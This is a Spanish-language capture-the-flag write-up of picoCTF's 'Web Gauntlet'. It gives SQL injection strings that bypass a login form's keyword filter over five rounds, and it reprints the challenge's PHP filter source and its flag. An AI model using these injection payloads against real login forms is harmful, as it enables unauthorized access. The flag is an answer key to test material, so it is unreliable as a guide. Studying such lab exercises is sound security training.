---
title: Web Gauntlet
date: 2025-07-20 17:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, pententing web, sqli]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---
>Web Gauntlet
Author: madStacks
If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.
Description
Can you beat the filters? Log in as admin jupiter.challenges.picoctf.org:54319 jupiter.challenges.picoctf.org:54319/filter.php
{: .prompt-tip }

Cuando abres las web encontrarás un formulario de usuario:password.
En el primer round verás que se trata de tratar de bypassear el login mediante inyecciones SQL. Pues la query del primer round se muestra en la propia web.

Al cabo de un rato de jugar con la página le puse un poco más de atención a la página *filter.php*, pues parece que nos quiere indicar algo, comienzo probando expresiones mientras capturo con Zap. 
Round 1 / 5
filter.php tenemos Round1: or

```
admin'--
```

Round 2 / 5
filter.php Round2: or and like = -- . Ahora entiendo mejor la mecánica, cada filtro indica una serie de expresiones que no podremos utilizar en la inyección. Así que cambio el -- de comentario por el multilínea /*

```
admin'/*
```

Round 3 / 5
filter.php Round3: or and = like > < --. Podemos repetir la inyección, mientras no usemos las expresiones expresada en los filtros. 

```
admin'/*
```

Round 4 / 5
filter.php Round4: or and = like > < -- admin. Concatenamos admin para que no se cumpla el filtro.

```
ad'||'min'/*
```

Round 5 / 5
Round5: or and = like > < -- union admin. Repetimos ya que cumple, de hecho supongo que se puede usar esta para todas las anteriores, pues pasaría todos los filtros. 

```
ad'||'min'/*
```

Round 6 / 5
Congrats! You won! Check out filter.php

Ok nos dice que miremos filter.php y nos entrega el código fuente con la flag

``` php
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
?> 
```
¿Interesante reto pero poco realista? Quiero decir que nadie va a cambiar esos filtros dinámicamente. ¿O sí? Todo es posible.

flag: **picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}**